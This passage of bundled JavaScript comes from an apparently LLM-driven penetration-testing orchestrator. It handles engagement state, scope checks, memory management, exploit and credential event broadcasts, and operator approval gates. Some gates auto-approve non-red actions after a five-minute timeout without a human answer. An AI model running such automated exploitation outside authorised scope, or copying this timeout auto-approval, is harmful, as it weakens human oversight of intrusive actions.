    if (!Array.isArray(asset.ports)) asset.ports = [];
    if (!Array.isArray(asset.zapFindings)) asset.zapFindings = [];
    if (!Array.isArray(asset.exploitAttempts)) asset.exploitAttempts = [];
    if (!Array.isArray(asset.confirmedCredentials)) asset.confirmedCredentials = [];
    for (const tr of asset.toolResults) {
      if (tr.findings && !Array.isArray(tr.findings)) {
        try {
          tr.findings = Array.isArray(tr.findings) ? tr.findings : Object.values(tr.findings);
        } catch {
          tr.findings = [];
        }
      } else if (!tr.findings) {
        tr.findings = [];
      }
    }
  }
  const actualPortCount = state.assets.reduce((sum, a) => sum + (a.ports?.length || 0), 0);
  if (actualPortCount > 0 && state.stats.portsFound === 0) {
    state.stats.portsFound = actualPortCount;
  }
  return state;
}
async function getOpsStateWithRecovery(engagementId) {
  const memState = opsStates.get(engagementId);
  if (memState) return normalizeOpsState(memState);
  try {
    const { loadOpsSnapshot } = await import("./db-D773P4Y2.js");
    const snapshot = await loadOpsSnapshot(engagementId);
    if (snapshot) {
      const normalized = normalizeOpsState(snapshot);
      console.log(`[OpsState] Recovered state for engagement #${engagementId} from DB snapshot (${normalized.assets?.length || 0} assets, normalized)`);
      opsStates.set(engagementId, normalized);
      return normalized;
    }
  } catch (e) {
    console.error(`[OpsState] Failed to recover from DB:`, e.message);
  }
  return null;
}
function isInRoeScope(state, hostname, ip) {
  const guard = state.roeScopeGuard;
  if (!guard) return true;
  const normalizedHost = hostname.toLowerCase().trim();
  const normalizedIp = (ip || "").trim();
  const hostWithoutPort = normalizedHost.includes(":") ? normalizedHost.split(":")[0] : normalizedHost;
  if (guard.authorizedDomains.some((d) => {
    const nd = d.toLowerCase().trim();
    return nd === normalizedHost || nd === hostWithoutPort;
  })) return true;
  if (normalizedIp && guard.authorizedIps.some((i) => i.trim() === normalizedIp)) return true;
  if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(hostWithoutPort)) {
    if (guard.authorizedIps.some((i) => i.trim() === hostWithoutPort)) return true;
  }
  return false;
}
function initOpsState(engagementId, engagementType) {
  const state = {
    engagementId,
    engagementType: engagementType || "pentest",
    phase: "idle",
    progress: 0,
    isRunning: false,
    isPaused: false,
    assets: [],
    log: [],
    approvalGates: [],
    skippedDomains: /* @__PURE__ */ new Set(),
    completedScans: {
      nucleiCompleted: /* @__PURE__ */ new Set(),
      zapCompleted: /* @__PURE__ */ new Set(),
      hydraCompleted: /* @__PURE__ */ new Set(),
      exploitCompleted: /* @__PURE__ */ new Set(),
      katanaCompleted: /* @__PURE__ */ new Set(),
      feroxbusterCompleted: /* @__PURE__ */ new Set(),
      ffufCompleted: /* @__PURE__ */ new Set(),
      testsslCompleted: /* @__PURE__ */ new Set(),
      paramDiscoveryCompleted: /* @__PURE__ */ new Set(),
      wafw00fCompleted: /* @__PURE__ */ new Set(),
      burpCompleted: /* @__PURE__ */ new Set(),
      lastCheckpointAt: Date.now()
    },
    exhaustiveExploit: true,
    // Default: attempt every exploit opportunity, don't stop at first success
    stats: {
      hostsScanned: 0,
      portsFound: 0,
      vulnsFound: 0,
      exploitsAttempted: 0,
      exploitsSucceeded: 0,
      sessionsOpened: 0,
      zapScansRun: 0,
      wafDetections: 0
    }
  };
  opsStates.set(engagementId, state);
  persistOpsStateDebounced(engagementId);
  return state;
}
function persistOpsStateDebounced(engagementId, delayMs = 2e3) {
  const existing = persistTimers.get(engagementId);
  if (existing) clearTimeout(existing);
  persistTimers.set(engagementId, setTimeout(async () => {
    persistTimers.delete(engagementId);
    const state = opsStates.get(engagementId);
    if (!state) return;
    try {
      const { saveOpsSnapshot } = await import("./db-D773P4Y2.js");
      await saveOpsSnapshot(engagementId, state);
    } catch (e) {
      console.error(`[OpsState] Failed to persist state for #${engagementId}:`, e.message);
    }
  }, delayMs));
}
async function persistOpsStateNow(engagementId) {
  const existing = persistTimers.get(engagementId);
  if (existing) clearTimeout(existing);
  persistTimers.delete(engagementId);
  const state = opsStates.get(engagementId);
  if (!state) return;
  try {
    const { saveOpsSnapshot } = await import("./db-D773P4Y2.js");
    await saveOpsSnapshot(engagementId, state);
  } catch (e) {
    console.error(`[OpsState] Failed to force-persist state for #${engagementId}:`, e.message);
  }
}
function getEngagementAbortSignal(engagementId) {
  let controller = engagementAbortControllers.get(engagementId);
  if (!controller) {
    controller = new AbortController();
    engagementAbortControllers.set(engagementId, controller);
  }
  return controller.signal;
}
function abortEngagement(engagementId) {
  const controller = engagementAbortControllers.get(engagementId);
  if (controller) {
    controller.abort();
    engagementAbortControllers.delete(engagementId);
  }
  releaseAllForEngagement(engagementId);
}
function startMemoryWatchdog() {
  if (memoryWatchdogInterval) return;
  memoryWatchdogInterval = setInterval(async () => {
    const mem = process.memoryUsage();
    const heapMB = mem.heapUsed / 1024 / 1024;
    const rssMB = mem.rss / 1024 / 1024;
    if (!global.__heapLimitMB) {
      try {
        const v8 = await import("v8");
        const stats = v8.getHeapStatistics();
        global.__heapLimitMB = Math.round(stats.heap_size_limit / 1024 / 1024);
      } catch {
        global.__heapLimitMB = 768;
      }
    }
    const heapLimitMB = global.__heapLimitMB;
    const HEAP_WARNING_MB = heapLimitMB * 0.6;
    const HEAP_CRITICAL_MB = heapLimitMB * 0.75;
    const RSS_EMERGENCY_MB = heapLimitMB * 1.3;
    const needsAction = heapMB > HEAP_WARNING_MB || rssMB > RSS_EMERGENCY_MB;
    if (needsAction) {
      const level = rssMB > RSS_EMERGENCY_MB ? "EMERGENCY" : heapMB > HEAP_CRITICAL_MB ? "CRITICAL" : "WARNING";
      console.warn(`[MemoryWatchdog] ${level}: ${heapMB.toFixed(0)}MB heap, ${rssMB.toFixed(0)}MB RSS, ${opsStates.size} active states`);
      const isEmergency = rssMB > RSS_EMERGENCY_MB || heapMB > HEAP_CRITICAL_MB;
      for (const [engId, state] of opsStates.entries()) {
        const evictAge = isEmergency ? 0 : 6e4;
        if (state.phase === "completed" || state.phase === "error") {
          const age = state.completedAt ? Date.now() - state.completedAt : Infinity;
          if (age > evictAge) {
            opsStates.delete(engId);
            console.warn(`[MemoryWatchdog] Evicted ${state.phase} engagement #${engId} from memory (age=${Math.round(age / 1e3)}s)`);
            continue;
          }
        }
        if (!state.isRunning && state.phase === "idle") {
          opsStates.delete(engId);
          console.warn(`[MemoryWatchdog] Evicted idle engagement #${engId} from memory`);
          continue;
        }
        if (isEmergency) {
          try {
            const { emergencyEviction, logMemoryProfile } = await import("./memory-manager-VARXZ63M.js");
            try {
              const { saveOpsSnapshot } = await import("./db-D773P4Y2.js");
              await saveOpsSnapshot(engId, state);
            } catch {
            }
            const result = emergencyEviction(state);
            console.warn(`[MemoryWatchdog] Emergency eviction for #${engId}: freed ~${(result.freedEstimateBytes / 1024).toFixed(0)}KB, actions: ${result.actions.join(", ")}`);
          } catch (e) {
            console.error(`[MemoryWatchdog] Emergency eviction failed for #${engId}:`, e.message);
          }
        } else {
          const maxLogsPerEng = Math.max(20, Math.floor(60 / Math.max(1, opsStates.size)));
          if (state.log.length > maxLogsPerEng) {
            state.log = state.log.slice(-maxLogsPerEng);
          }
          for (const asset of state.assets) {
            for (const tr of asset.toolResults || []) {
              if (tr.outputPreview && tr.outputPreview.length > 256) {
                tr.outputPreview = tr.outputPreview.slice(0, 256) + "...[trimmed]";
              }
              if (tr.findings && tr.findings.length > 10) {
                tr.findings = tr.findings.slice(0, 10);
              }
            }
          }
          if (state.passiveReconResults) {
            delete state.passiveReconResults;
          }
          for (const key of ["vulnAnalysisSuppressed", "fpSuppressionStats", "scanFeedbackLoop", "cloudDetection"]) {
            if (state[key]) delete state[key];
          }
        }
      }
      if (isEmergency) {
        const cleared = clearKnowledgeCache();
        if (cleared > 0) console.warn(`[MemoryWatchdog] Cleared ${cleared} knowledge module caches`);
      }
      if (global.gc) {
        global.gc();
      }
    }
  }, 1e4);
}
function stopMemoryWatchdog() {
  if (memoryWatchdogInterval) {
    clearInterval(memoryWatchdogInterval);
    memoryWatchdogInterval = null;
  }
}
function getHealthStatus() {
  const mem = process.memoryUsage();
  const activeEngagements = [];
  for (const [engId, state] of opsStates.entries()) {
    activeEngagements.push({
      id: engId,
      phase: state.phase,
      progress: state.progress,
      assets: state.assets.length,
      logs: state.log.length
    });
  }
  return {
    status: "ok",
    timestamp: Date.now(),
    uptime: process.uptime(),
    pid: process.pid,
    nodeVersion: process.version,
    serverInstanceId: _serverInstanceId,
    memory: {
      heapUsedMB: Math.round(mem.heapUsed / 1024 / 1024),
      heapTotalMB: Math.round(mem.heapTotal / 1024 / 1024),
      rssMB: Math.round(mem.rss / 1024 / 1024),
      externalMB: Math.round(mem.external / 1024 / 1024),
      arrayBuffersMB: Math.round((mem.arrayBuffers || 0) / 1024 / 1024)
    },
    memoryWatchdog: {
      running: memoryWatchdogInterval !== null,
      heapLimitMB: global.__heapLimitMB || 768,
      heapWarningThresholdMB: Math.round((global.__heapLimitMB || 768) * 0.6),
      heapCriticalThresholdMB: Math.round((global.__heapLimitMB || 768) * 0.75),
      rssEmergencyThresholdMB: Math.round((global.__heapLimitMB || 768) * 1.3)
    },
    scanConcurrency: getScanConcurrencyMetrics(),
    engagements: {
      activeCount: opsStates.size,
      details: activeEngagements
    }
  };
}
async function flushAllPendingState() {
  for (const [engId, timer] of persistTimers.entries()) {
    clearTimeout(timer);
    persistTimers.delete(engId);
  }
  for (const [engId, timer] of periodicPersistTimers.entries()) {
    clearInterval(timer);
    periodicPersistTimers.delete(engId);
  }
  const activeEngagements = Array.from(opsStates.entries());
  if (activeEngagements.length === 0) return 0;
  console.log(`[GracefulShutdown] Flushing ${activeEngagements.length} active engagement state(s) to DB...`);
  let flushed = 0;
  try {
    const { saveOpsSnapshot } = await import("./db-D773P4Y2.js");
    await Promise.allSettled(
      activeEngagements.map(async ([engId, state]) => {
        try {
          await saveOpsSnapshot(engId, state);
          flushed++;
          console.log(`[GracefulShutdown] Flushed state for engagement #${engId} (phase=${state.phase}, progress=${state.progress}%)`);
        } catch (e) {
          console.error(`[GracefulShutdown] Failed to flush state for #${engId}: ${e.message}`);
        }
      })
    );
  } catch (e) {
    console.error(`[GracefulShutdown] DB import failed during flush: ${e.message}`);
  }
  for (const [engId, controller] of engagementAbortControllers.entries()) {
    controller.abort();
    engagementAbortControllers.delete(engId);
  }
  try {
    const { releaseAllClaims } = await import("./engagement-claim-lock-3DJGBX7I.js");
    await releaseAllClaims();
  } catch (e) {
    console.error(`[GracefulShutdown] Failed to release claim locks: ${e.message}`);
  }
  console.log(`[GracefulShutdown] Flushed ${flushed}/${activeEngagements.length} engagement states`);
  return flushed;
}
function broadcastOpsUpdate(engagementId, data) {
  try {
    eventHub.broadcastEngagement(engagementId, {
      type: "engagement:progress_update",
      timestamp: Date.now(),
      engagementId,
      data
    });
  } catch (e) {
    console.error(`[broadcastOpsUpdate] WebSocket broadcast failed for #${engagementId}:`, e.message);
  }
}
function broadcastReconFinding(engagementId, finding) {
  try {
    eventHub.broadcastEngagement(engagementId, {
      type: "recon:finding",
      timestamp: Date.now(),
      engagementId,
      data: finding
    });
  } catch (e) {
  }
}
function broadcastCredentialFound(engagementId, cred) {
  try {
    eventHub.broadcastEngagement(engagementId, {
      type: "credential:found",
      timestamp: Date.now(),
      engagementId,
      data: cred
    });
  } catch (e) {
  }
}
function broadcastExploitFired(engagementId, exploit) {
  try {
    eventHub.broadcastEngagement(engagementId, {
      type: "exploit:fired",
      timestamp: Date.now(),
      engagementId,
      data: exploit
    });
  } catch (e) {
  }
}
function broadcastExploitResult(engagementId, result) {
  try {
    eventHub.broadcastEngagement(engagementId, {
      type: "exploit:result",
      timestamp: Date.now(),
      engagementId,
      data: result
    });
  } catch (e) {
  }
}
function addLog(state, entry) {
  if (state.log.length > 0) {
    const last = state.log[state.log.length - 1];
    if (last.title === entry.title && last.detail === entry.detail) {
      last.timestamp = Date.now();
      broadcastOpsUpdate(state.engagementId, { type: "log", entry: last });
      return;
    }
  }
  const logEntry = { id: genId(), timestamp: Date.now(), ...entry };
  state.log.push(logEntry);
  const heapMB = process.memoryUsage().heapUsed / 1024 / 1024;
  const maxLogs = heapMB > 200 ? 30 : heapMB > 150 ? 50 : heapMB > 100 ? 80 : 150;
  if (state.log.length > maxLogs) state.log = state.log.slice(-maxLogs);
  if (heapMB > 120) {
    const outputCap = heapMB > 200 ? 128 : heapMB > 150 ? 256 : 512;
    for (const asset of state.assets) {
      for (const tr of asset.toolResults || []) {
        if (tr.outputPreview && tr.outputPreview.length > outputCap) {
          tr.outputPreview = tr.outputPreview.slice(0, outputCap) + "...[trimmed]";
        }
      }
    }
  }
  if (heapMB > 180 && state.log.length % 50 === 0 && global.gc) {
    global.gc();
  }
  broadcastOpsUpdate(state.engagementId, { type: "log", entry: logEntry });
  persistOpsStateDebounced(state.engagementId);
  if (entry.type === "llm_decision") {
    captureDecision({
      engagementId: state.engagementId,
      phase: entry.phase,
      caller: `engagement-orchestrator.${entry.phase}`,
      decision: entry.title,
      reasoning: entry.detail || "",
      actions: entry.data ? [{ type: "llm_analysis", params: entry.data }] : [],
      contextSummary: entry.detail?.slice(0, 2e3),
      knowledgeModules: [
        "owasp_testing",
        ...entry.phase === "vuln_detection" || entry.phase === "exploitation" ? ["burp_pentesting", "zap_pentesting", "cross_tool_intelligence"] : [],
        ...entry.phase === "enumeration" ? ["recon_methodology"] : []
      ]
    }).catch(() => {
    });
    emitLLMDecision({
      engagementId: state.engagementId,
      agent: `engagement-orchestrator.${entry.phase}`,
      decisionType: "analysis",
      action: entry.title,
      confidence: typeof entry.data?.confidence === "number" ? entry.data.confidence : 0.7,
      stealthScore: entry.data?.stealthScore,
      reasoning: entry.detail?.slice(0, 500) || ""
    });
  }
  const persistableTypes = [
    "phase_complete",
    "scan_result",
    "finding",
    "exploit_attempt",
    "exploit_success",
    "exploit_fail",
    "c2_deploy",
    "pivot",
    "evidence",
    "llm_decision",
    "zap_scan",
    "waf_detected",
    "warning"
  ];
  if (persistableTypes.includes(entry.type)) {
    persistTimelineEvent(state.engagementId, logEntry).catch(() => {
    });
  }
  if (entry.type === "phase_complete") {
    emitLLMEngagementProgress({
      engagementId: state.engagementId,
      engagementName: `Engagement #${state.engagementId}`,
      target: state.assets?.[0]?.hostname || "unknown",
      phase: entry.phase,
      progress: entry.phase === "completed" ? 100 : 50,
      findingsCount: state.stats?.vulnsFound || 0,
      activeAgents: [],
      llmCallsTotal: 0
    });
  }
  return logEntry;
}
async function persistTimelineEvent(engagementId, logEntry) {
  try {
    const { getDb } = await import("./db-D773P4Y2.js");
    const { engagementTimelineEvents } = await import("./schema-RL5B6OMI.js");
    const db = await getDb();
    const eventType = OPS_TO_TIMELINE_TYPE[logEntry.type] || "note_added";
    const severity = OPS_TO_SEVERITY[logEntry.type] || "info";
    await db.insert(engagementTimelineEvents).values({
      engagementId,
      phase: logEntry.phase || "unknown",
      eventType,
      severity,
      title: logEntry.title.slice(0, 512),
      description: logEntry.detail?.slice(0, 2e3),
      metadata: logEntry.data || null,
      sourceModule: "engagement-orchestrator",
      timestamp: logEntry.timestamp
    });
  } catch (err) {
    console.error(`[TimelinePersist] Failed to persist timeline event:`, err.message);
  }
}
async function persistScanResult(opts) {
  try {
    const { insertScanResult, saveEngagementFindings } = await import("./db-D773P4Y2.js");
    const severitySummary = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    for (const f of opts.findings) {
      const sev = (f.severity || "info").toLowerCase();
      if (sev in severitySummary) severitySummary[sev]++;
    }
    const scanResult = await insertScanResult({
      engagementId: opts.engagementId,
      tool: opts.tool,
      target: opts.target,
      command: opts.command,
      rawOutput: opts.stdout.slice(0, 1e5),
      // cap at 100KB (reduced from 1MB to prevent OOM)
      rawStderr: (opts.stderr || "").slice(0, 5e4),
      exitCode: opts.exitCode,
      durationMs: opts.durationMs,
      timedOut: opts.timedOut,
      findings: opts.findings,
      findingCount: opts.findings.length,
      severitySummary,
      phase: opts.phase,
      operatorId: opts.operatorId
    });
    if (opts.findings.length > 0) {
      try {
        const resultId = scanResult?.id;
        const findingsToPromote = opts.findings.filter((f) => f.title || f.name || f.alert || f.template_id).map((f) => {
          const sev = (f.severity || f.risk || "info").toLowerCase();
          const mappedSev = sev === "moderate" ? "medium" : ["critical", "high", "medium", "low", "info"].includes(sev) ? sev : "info";
          return {
            engagementId: opts.engagementId,
            resultId,
            title: (f.title || f.name || f.alert || f.template_id || "Untitled").slice(0, 500),
            severity: mappedSev,
            cve: f.cve || f.cve_id || void 0,
            cwe: f.cwe || void 0,
            description: (f.description || f.desc || f.info || "").slice(0, 65e3) || void 0,
            endpoint: f.endpoint || f.url || f.matched_at || void 0,
            hostname: f.hostname || f.host || opts.target?.replace(/https?:\/\//, "").split(":")[0] || void 0,
            port: f.port || void 0,
            source: f.source || opts.tool,
            tool: opts.tool,
            corroborationTier: f.corroborationTier || f.corroboration_tier || "unverified",
            rawEvidence: (f.rawEvidence || f.raw_evidence || f.evidence || f.curl_command || "").slice(0, 65e3) || void 0,
            exploitAttempted: !!f.exploit_attempted,
            exploitSucceeded: !!f.exploit_succeeded,
            owaspCategory: f.owasp_category || f.owaspCategory || void 0,
            mitreTechnique: f.mitre_technique || f.mitreTechnique || void 0
          };
        });
        if (findingsToPromote.length > 0) {
          const promoted = await saveEngagementFindings(findingsToPromote);
          if (promoted > 0) {
            console.log(`[FindingPromotion] Real-time: promoted ${promoted} findings from ${opts.tool} scan on ${opts.target} to engagement_findings`);
          }
        }
      } catch (promoteErr) {
        console.error(`[FindingPromotion] Failed to promote ${opts.tool} findings:`, promoteErr.message);
      }
    }
  } catch (e) {
    console.error(`[persistScanResult] Failed to save ${opts.tool} result for ${opts.target}:`, e.message);
  }
}
function shouldAutoApprove(state, riskTier) {
  if (state.trainingLabMode === true) return true;
  const TIER_ORDER = { yellow: 0, orange: 1, red: 2 };
  const currentTierIdx = TIER_ORDER[riskTier] ?? -1;
  const hasManualPrecedent = state.approvalGates.some(
    (g) => g.status === "approved" && g.resolvedBy && !g.resolvedBy.startsWith("auto-") && // Must be a real manual approval, not auto-timeout/auto-roe
    (TIER_ORDER[g.riskTier] ?? -1) >= currentTierIdx
  );
  if (hasManualPrecedent) return true;
  const roeStatus = state.roeScopeGuard?.roeStatus;
  if (roeStatus !== "signed") return false;
  if (riskTier === "red") return false;
  return true;
}
async function requestApproval(state, gate) {
  if (shouldAutoApprove(state, gate.riskTier)) {
    const isTrainingLab = state.trainingLabMode === true;
    const hasPrecedent = !isTrainingLab && state.approvalGates.some(
      (g) => g.status === "approved" && g.resolvedBy && !g.resolvedBy.startsWith("auto-") && ({ yellow: 0, orange: 1, red: 2 }[g.riskTier] ?? -1) >= ({ yellow: 0, orange: 1, red: 2 }[gate.riskTier] ?? -1)
    );
    const autoReason = isTrainingLab ? "training-lab" : hasPrecedent ? "operator-precedent" : "signed-roe";
    const autoLabel = isTrainingLab ? "Training Lab" : hasPrecedent ? "Operator Precedent" : "Signed RoE";
    const approval2 = {
      id: genId(),
      status: "approved",
      createdAt: Date.now(),
      resolvedAt: Date.now(),
      resolvedBy: `auto-approval:${autoReason}`,
      ...gate
    };
    state.approvalGates.push(approval2);
    addLog(state, {
      phase: gate.phase,
      type: "approval_response",
      title: `\u2705 Auto-Approved (${autoLabel}): ${gate.title}`,
      detail: `${gate.description} \u2014 Auto-approved via ${autoLabel.toLowerCase()} (risk tier: ${gate.riskTier}).`,
      data: gate.detail,
      riskTier: gate.riskTier
    });
    broadcastOpsUpdate(state.engagementId, {
      type: "approval_resolved",
      gateId: approval2.id,
      approved: true
    });
    return true;
  }
  const safetyEng = getSafetyEngine(state.engagementId);
  const isDualApproval = safetyEng.getProfile().dualApprovalRequired === true && gate.riskTier === "red";
  const requiredApprovals = isDualApproval ? 2 : 1;
  const approval = {
    id: genId(),
    status: "pending",
    createdAt: Date.now(),
    ...gate,
    dualApprovalRequired: isDualApproval,
    approvers: [],
    requiredApprovals
  };
  state.approvalGates.push(approval);
  state.isPaused = true;
  state.currentAction = isDualApproval ? `\u23F8 Awaiting dual approval (0/${requiredApprovals}): ${gate.title}` : `\u23F8 Awaiting approval: ${gate.title}`;
  addLog(state, {
    phase: gate.phase,
    type: "approval_request",
    title: isDualApproval ? `\u{1F510} Dual Approval Required (0/${requiredApprovals}): ${gate.title}` : `\u{1F512} Approval Required: ${gate.title}`,
    detail: isDualApproval ? `${gate.description}

\u26A0\uFE0F DUAL-APPROVAL: This red-tier action requires ${requiredApprovals} independent approvers. Each approver must be a distinct operator.` : gate.description,
    data: { ...gate.detail, dualApprovalRequired: isDualApproval, requiredApprovals },
    riskTier: gate.riskTier
  });
  broadcastOpsUpdate(state.engagementId, {
    type: "approval_required",
    gate: approval
  });
  return new Promise((resolve) => {
    const timeoutId = setTimeout(() => {
      const autoDecision = gate.riskTier !== "red";
      approval.status = autoDecision ? "approved" : "denied";
      approval.resolvedAt = Date.now();
      approval.resolvedBy = `auto-timeout:${autoDecision ? "approved" : "denied"}`;
      state.isPaused = false;
      approvalResolvers.delete(approval.id);
      addLog(state, {
        phase: gate.phase,
        type: "approval_response",
        title: autoDecision ? `\u2705 Auto-Approved (Timeout): ${gate.title}` : `\u274C Auto-Denied (Timeout): ${gate.title}`,
        detail: `No operator response after 5 minutes. ${autoDecision ? "Auto-approved" : "Auto-denied"} based on risk tier (${gate.riskTier}).`,
        riskTier: gate.riskTier
      });
      broadcastOpsUpdate(state.engagementId, {
        type: "approval_resolved",
        gateId: approval.id,
        approved: autoDecision
      });
      resolve(autoDecision);
    }, 5 * 60 * 1e3);
    approvalResolvers.set(approval.id, (approved) => {
      clearTimeout(timeoutId);
      approval.status = approved ? "approved" : "denied";
      approval.resolvedAt = Date.now();
      state.isPaused = false;
      addLog(state, {
        phase: gate.phase,
        type: "approval_response",
        title: approved ? `\u2705 Approved: ${gate.title}` : `\u274C Denied: ${gate.title}`,
        detail: approved ? "Operator approved the action" : "Operator denied the action",
        riskTier: gate.riskTier
      });
      broadcastOpsUpdate(state.engagementId, {
        type: "approval_resolved",
        gateId: approval.id,
        approved
      });
      resolve(approved);
    });
  });
}
function resolveApproval(gateId, approved, resolvedBy) {
  const resolver = approvalResolvers.get(gateId);
  if (!resolver) return false;
  let matchedGate;
  let matchedState;
  for (const [, state] of opsStates) {
    const gate = state.approvalGates.find((g) => g.id === gateId);
    if (gate) {
      matchedGate = gate;
      matchedState = state;
      break;
    }
  }
  if (!approved) {
    if (matchedGate) {
      matchedGate.resolvedBy = resolvedBy;
    }
    resolver(false);
    approvalResolvers.delete(gateId);
    return true;
  }
  if (matchedGate?.dualApprovalRequired && (matchedGate.requiredApprovals || 2) > 1) {
    const approvers = matchedGate.approvers || [];
    const approverId = resolvedBy || "unknown";
    if (approvers.includes(approverId)) {
      if (matchedState) {
        addLog(matchedState, {
          phase: matchedGate.phase,
          type: "warning",
          title: `\u26A0\uFE0F Duplicate Approver Rejected: ${matchedGate.title}`,
          detail: `Operator '${approverId}' already approved this gate. Dual-approval requires ${matchedGate.requiredApprovals} distinct approvers.`,
          riskTier: matchedGate.riskTier
        });
      }
      return "partial";
    }
    approvers.push(approverId);
    matchedGate.approvers = approvers;
    if (approvers.length < (matchedGate.requiredApprovals || 2)) {
      if (matchedState) {
        matchedState.currentAction = `\u23F8 Awaiting dual approval (${approvers.length}/${matchedGate.requiredApprovals}): ${matchedGate.title}`;
        addLog(matchedState, {
          phase: matchedGate.phase,
          type: "approval_response",
          title: `\u{1F510} Partial Approval (${approvers.length}/${matchedGate.requiredApprovals}): ${matchedGate.title}`,
          detail: `Operator '${approverId}' approved. Waiting for ${(matchedGate.requiredApprovals || 2) - approvers.length} more independent approver(s).`,
          riskTier: matchedGate.riskTier
        });
        broadcastOpsUpdate(matchedState.engagementId, {
          type: "approval_partial",
          gateId: matchedGate.id,
          approvers: [...approvers],
          requiredApprovals: matchedGate.requiredApprovals
        });
      }
      return "partial";
    }
    matchedGate.resolvedBy = approvers.join(",");
    if (matchedState) {
      addLog(matchedState, {
        phase: matchedGate.phase,
        type: "approval_response",
        title: `\u2705 Dual Approval Complete (${approvers.length}/${matchedGate.requiredApprovals}): ${matchedGate.title}`,
        detail: `All ${matchedGate.requiredApprovals} independent approvers confirmed: [${approvers.join(", ")}]. Gate resolved.`,
        riskTier: matchedGate.riskTier
      });
    }
    resolver(true);
    approvalResolvers.delete(gateId);
    return true;
  }
  if (matchedGate) {
    matchedGate.resolvedBy = resolvedBy;
  }
  resolver(true);
  approvalResolvers.delete(gateId);
  return true;
}
function dismissStaleApproval(gateId, resolvedBy) {
  if (approvalResolvers.has(gateId)) return false;
  for (const [, state] of opsStates) {
    const gate = state.approvalGates.find((g) => g.id === gateId && g.status === "pending");
    if (gate) {
      gate.status = "denied";
      gate.resolvedAt = Date.now();
      gate.resolvedBy = resolvedBy || "dismissed:stale-gate";
      const hasOtherPending = state.approvalGates.some((g) => g.id !== gateId && g.status === "pending");
      if (!hasOtherPending) {
        state.isPaused = false;
      }
      addLog(state, {
        phase: gate.phase,
        type: "approval_response",
        title: `\u{1F5D1}\uFE0F Dismissed (Stale): ${gate.title}`,
        detail: `Approval gate dismissed \u2014 the server restarted while this gate was pending, so the action context was lost. The engagement pipeline will continue without this action.`,
        riskTier: gate.riskTier
      });
      broadcastOpsUpdate(state.engagementId, {
        type: "approval_resolved",
        gateId: gate.id,
        approved: false
      });
      return true;
    }
  }
  return false;
}
function dismissAllStaleApprovals(engagementId, resolvedBy) {
  const state = opsStates.get(engagementId);
  if (!state) return 0;
  let dismissed = 0;
  const staleGates = state.approvalGates.filter(
    (g) => g.status === "pending" && !approvalResolvers.has(g.id)
  );
  for (const gate of staleGates) {
    gate.status = "denied";
    gate.resolvedAt = Date.now();
    gate.resolvedBy = resolvedBy || "dismissed:stale-gate-bulk";
    addLog(state, {
      phase: gate.phase,
      type: "approval_response",
      title: `\u{1F5D1}\uFE0F Dismissed (Stale): ${gate.title}`,
      detail: `Stale approval gate auto-dismissed after server restart.`,
      riskTier: gate.riskTier
    });
    broadcastOpsUpdate(state.engagementId, {
      type: "approval_resolved",
      gateId: gate.id,
      approved: false
    });
    dismissed++;
  }
  if (dismissed > 0) {
    state.isPaused = false;
  }
  return dismissed;
}
function getApprovalGateDetail(gateId) {
  for (const [engId, state] of opsStates) {
    const gate = state.approvalGates.find((g) => g.id === gateId);
    if (gate) {
      gate._engagementId = engId;
      return gate;
    }
  }
  return null;
}
async function auditLog(params) {
  try {
    const { getDb } = await import("./db-D773P4Y2.js");
    const { offensiveAuditLog } = await import("./schema-RL5B6OMI.js");
    const db = await getDb();
    if (db) {
      await db.insert(offensiveAuditLog).values({
        engagementId: params.engagementId,
        operatorId: params.operatorId,
        operatorName: params.operatorName,
        actionType: params.actionType,
        riskTier: params.riskTier,
        target: params.target,
        targetPort: params.targetPort,
        moduleOrTool: params.moduleOrTool,
        roeStatus: params.roeStatus || "in_scope",
        actionDetail: params.actionDetail,
        resultStatus: params.resultStatus,
        resultDetail: params.resultDetail,
        ipAddress: params.ipAddress
      });
    }
  } catch (e) {
    console.warn("[OpsAudit] Failed to write audit log:", e);
  }
}
async function generateScanPlan(engagementId) {
  const state = opsStates.get(engagementId);
  if (!state) throw new Error("No ops state found for engagement");
  if (state.assets.length === 0) throw new Error("No assets discovered yet \u2014 run passive scan first");
  addLog(state, {
    phase: state.phase,
    type: "info",
    title: "\u{1F9E0} LLM Scan Plan Analysis Starting",
    detail: `Analyzing ${state.assets.length} discovered assets to determine optimal ScanForge discovery settings and active scan tools...`
  });
  broadcastOpsUpdate(engagementId, { type: "phase_change", phase: "scan_planning" });
  const assetSummaries = state.assets.map((a) => {
    const info = {
      hostname: a.hostname,
      ip: a.ip || "unknown",
      type: a.type,
      status: a.status,
      knownPorts: a.ports.map((p) => `${p.port}/${p.service}${p.version ? ` (${p.version})` : ""}`),
      existingVulns: a.vulns.length,
      wafDetected: a.wafDetected || "none"
    };
    if (a.passiveRecon) {
      const pr = a.passiveRecon;
      if (pr.services.length > 0) {
        info.passiveServices = pr.services.map(
          (s) => `${s.port}/${s.protocol} ${s.service}${s.product ? ` (${s.product}${s.version ? " " + s.version : ""})` : ""} [source: ${s.source}]`
        );
      }
      if (pr.technologies.length > 0) info.technologies = pr.technologies;
      if (pr.subdomains.length > 0) info.discoveredSubdomains = pr.subdomains.slice(0, 20);
      if (pr.ipAddresses.length > 0) info.resolvedIPs = pr.ipAddresses;
      if (pr.certificates.length > 0) info.certificates = pr.certificates.slice(0, 5).map(
        (c) => `${c.subject}${c.issuer ? ` (issued by: ${c.issuer})` : ""}${c.validTo ? ` expires: ${c.validTo}` : ""}`
      );
      if (pr.riskSignals.length > 0) info.passiveRiskSignals = pr.riskSignals.map(
        (s) => `[${s.severity}] ${s.type}: ${s.rationale}`
      );
      if (pr.wafDetected) info.wafDetected = pr.wafDetected;
      if (pr.cloudProvider) info.cloudProvider = pr.cloudProvider;
      if (pr.historicalUrls.length > 0) info.historicalUrlCount = pr.historicalUrls.length;
      if (pr.dnsRecords && Object.keys(pr.dnsRecords).length > 0) info.dnsRecords = pr.dnsRecords;
      if (pr.emailSecurity) info.emailSecurity = pr.emailSecurity;
      if (pr.breachExposure) info.breachExposure = pr.breachExposure;
      info.passiveReconSources = pr.sources;
      info.totalPassiveObservations = pr.rawObservationCount;
    }
    if (a.toolResults && a.toolResults.length > 0) {
      info.previousToolResults = a.toolResults.map((tr) => ({
        tool: tr.tool,
        findingCount: tr.findingCount,
        findings: tr.findings.slice(0, 5).map((f) => `[${f.severity}] ${f.title}`),
        phase: tr.phase
      }));
    }
    return info;
  });
  const domainReconSummary = state.passiveReconResults ? Object.entries(state.passiveReconResults).map(([domain, data]) => ({
    domain,
    totalAssets: data.totalAssets,
